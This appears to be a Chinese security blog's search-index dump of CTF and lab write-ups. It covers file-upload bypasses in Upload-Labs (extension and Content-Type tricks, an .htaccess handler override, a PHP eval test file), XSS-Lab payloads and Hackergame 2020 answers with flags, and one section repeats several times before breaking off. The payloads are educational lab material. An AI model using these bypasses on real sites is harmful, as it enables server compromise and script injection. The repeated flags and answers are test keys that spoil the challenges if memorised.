//判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } ​ 把文件后缀名改成jpg格式上传，使用burp suit抓包。把.jpg后缀重新改为.php即可实现绕过前端JS代码。 ​ 然后右键打开图片，代码成功执行。完工 ​ 注：后面题目的php代码都使用2333.php： \u003c?php eval(phpinfo()); ​ 执行结果是打印出php版本信息。 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#pass-01"},{"categories":["DROPS"],"content":"Pass-02​ 源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } } ​ 发现文件判断是根据image/jpeg、image/png...进行过滤判定，这些值都是Http请求中的Content-Type常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:Http请求中Content-Type。 ​ 同样是burp抓包修改Content-Type的值。 ​ 打开图片，php代码成功执行。完工 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#pass-02"},{"categories":["DROPS"],"content":"Pass-03源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 发现只过滤了.asp、.aspx、.php、.jsp文件，那么可以使用php3、phtml、phps、php5文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；而php3，我的理解是php之前版本的文件后缀，如php5。 ​ 直接把2333.php改为2333.php3上传打开，执行成功。完工 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#pass-03"},{"categories":["DROPS"],"content":"Pass-04源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.htaccess文件过滤，所以上传一个.htaccess文件内容如下： SetHandler application/x-httpd-php ​ 原理的话我讲一下个人的见解：.htaccess文件是一个apache服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为php。参考的博客：htaccess使用方法介绍。 ​ 接下来上传2333.jpg图片木马，再打开就会被成功解析为php文件并执行： ​ 完工 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#pass-04"},{"categories":["DROPS"],"content":"Pass-05源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 细心的话可以发现，这道题的源码中在末尾添加了.htaccess文件过滤，但是也少了一条语句 $file_ext = strtolower($file_ext); //转换为小写 目标就很明确了，直接使用大小写绕过过滤。 ​ 打开图片成功执行。完工 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#pass-05"},{"categories":["CTF"],"content":"一闪而过的Flag​ 根据题目信息程序每次运行时隐约可见黑色控制台上有 flag 一闪而过，我想到了应该能看程序的代码啥的找到，但是天下武功，唯快不破，下载 运行 截图一气呵成。 ​ ​ 接下来让我康康哪一位是瞎子，包括答案里也是满满的嘲讽。 参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?} ","date":"2020-11-05","objectID":"/posts/hackgame20202/:0:1","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/hackgame20202/#一闪而过的flag"},{"categories":["CTF"],"content":"从零开始的记账工具人​ npy给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。 ​ 原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下： import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sn = new Scanner(System.in); String str; int x; int cnt=0; double result=0; while(cnt++!=1000){ str = sn.next(); x = sn.nextInt(); result += tonum(str)*x; } System.out.println(result); } public static double tonum(String s){ int len; double res=0,temp = 1; double result=0; len = s.length(); for(int i=0;i\u003clen;i++){ switch (s.charAt(i)){ case '壹': temp=1;break; case '贰': temp=2;break; case '叁': temp=3;break; case '肆': temp=4;break; case '伍': temp=5;break; case '陆': temp=6;break; case '柒': temp=7;break; case '捌': temp=8;break; case '玖': temp=9;break; case '零': break; case '拾': res+=temp*10;temp=0;break; case '佰': res+=temp*100;temp=0;break; case '元': res+=temp;temp=0;break; case '角': res+=temp*0.1;temp=0;break; case '分': res+=temp*0.01;temp=0;break; case '整': break; default: System.out.println(\"这个认不出来\" + s.charAt(i)); } } return res; } } ​ 程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用switch判断数字或是个、十、百、千那一位上的数字。 ​ Java渣轻喷。 参考答案：flag{19115.33} ","date":"2020-11-05","objectID":"/posts/hackgame20202/:0:2","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/hackgame20202/#从零开始的记账工具人"},{"categories":["CTF"],"content":"超简单的世界模拟器​ 这道题下面有两道小题 ","date":"2020-11-05","objectID":"/posts/hackgame20202/:0:3","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/hackgame20202/#超简单的世界模拟器"},{"categories":["CTF"],"content":"蝴蝶效应​ 先看有意思的一个漫画 ​ 一个人用石头模拟了一整个宇宙，斯巴拉西。 ​ 打开题目以后是一个终端，然提示等待你输入一个15*15矩阵（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息生命游戏，百度百科看了一下这个生命游戏，游戏的规则大致就是：一个细胞会根据周围的细胞数量判断存活和死亡，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。 ​ 返回终端里面一片白中间有几个框框，题目中 如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag： “清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。 ​ 用细胞去碰框框就是了，正好也看到了一个知乎的提问：生命游戏(Game of Life)有哪些图形? - 知乎，看了看内容更有趣了。 ​ 大师我悟了，就是提供一个初始的15*15矩阵，根据生命游戏的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形 第一关 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 ​ 第一关打上面的黑框，刚好在上面15行的范围内，用一个轻量级飞船直线打过去即可。 第二关 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 001100000000000 011110000000000 011011000001100 000110000011110 000000000011011 000000000000110 ​ 第二关我期初试了试滑翔者放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个三飞船，正好把两个黑框都给消了。 参考答案： 1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641} 2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8} 完工。 ","date":"2020-11-05","objectID":"/posts/hackgame20202/:0:4","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/hackgame20202/#蝴蝶效应"},{"categories":["DROPS"],"content":"头靶机地址：https://buuoj.cn/challenges#XSS-Lab ","date":"2020-11-03","objectID":"/posts/xss-lab1/:1:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#头"},{"categories":["DROPS"],"content":"level 1​ ​ 观察发现欢迎用户test与URL中的name=test字段对应，尝试修改发现可行。直接将name字段改为name=\u003cscript\u003ealert()\u003c/script\u003e，完工。 ","date":"2020-11-03","objectID":"/posts/xss-lab1/:2:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#level-1"},{"categories":["DROPS"],"content":"level 2​ 在搜索栏中的输入会回显到页面，查看网页源代码，发现值在input的value属性中 ​ 构造闭合\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // ，构造以后的标签会变成.... value=\"\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // \"\u003e。完工 ","date":"2020-11-03","objectID":"/posts/xss-lab1/:3:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#level-2"},{"categories":["DROPS"],"content":"level 3​ 老样子构造value属性闭合，尝试\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // 构造闭合，查看网页源代码发现语句变成\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // ，说明把\"、\u003c、\u003e、进行了html编码过滤，尝试构造onmouseover事件(鼠标移到事件)，构造语句'onmouseover='alert()'。完工 ","date":"2020-11-03","objectID":"/posts/xss-lab1/:4:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#level-3"},{"categories":["DROPS"],"content":"level 4​ 构造闭合\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // ，查看源代码发现进行了\u003e、\u003c过滤，尝试构造事件\" onmouseover='alert()'。完工 ​ 说明一下标签的事件有很多类型，可以自己试试别的事件响应。 ","date":"2020-11-03","objectID":"/posts/xss-lab1/:5:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#level-4"},{"categories":["DROPS"],"content":"level 5​ 检查一下都有什么过滤。发现有一下过滤 script –\u003e scr_ipt onmouseover –\u003e o_nmouseover 无法采用事件，那么尝试构造一个标签 \"\u003e \u003ca href='javascript:alert()'\u003e233\u003c/a\u003e //，发现javascript没有过滤，说明判断语句匹配值仅仅为script，点击构造的\u003ca\u003e标签内容。完工 ​ ","date":"2020-11-03","objectID":"/posts/xss-lab1/:6:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/xss-lab1/#level-5"},{"categories":["CTF"],"content":"前言比赛地址：https://hack.lug.ustc.edu.cn/ ","date":"2020-11-01","objectID":"/posts/hackgame20201/:1:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#前言"},{"categories":["CTF"],"content":"web","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#web"},{"categories":["CTF"],"content":"签到题​ 第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。 ​ 随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数 ​ 我猜的题目可能是想让数值为1时能提取到flag。 ​ F12查看源代码，定位到进度条的标签，查看属性 ​ 确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#签到题"},{"categories":["CTF"],"content":"2048​ 打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！ F12开始翻网页资源 ​ 还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。 ​ 打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。 发现了 ​ 只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:2","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#2048"},{"categories":["CTF"],"content":"general","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#general"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#猫咪问题"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#第一题"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#第二题"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#第三题"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 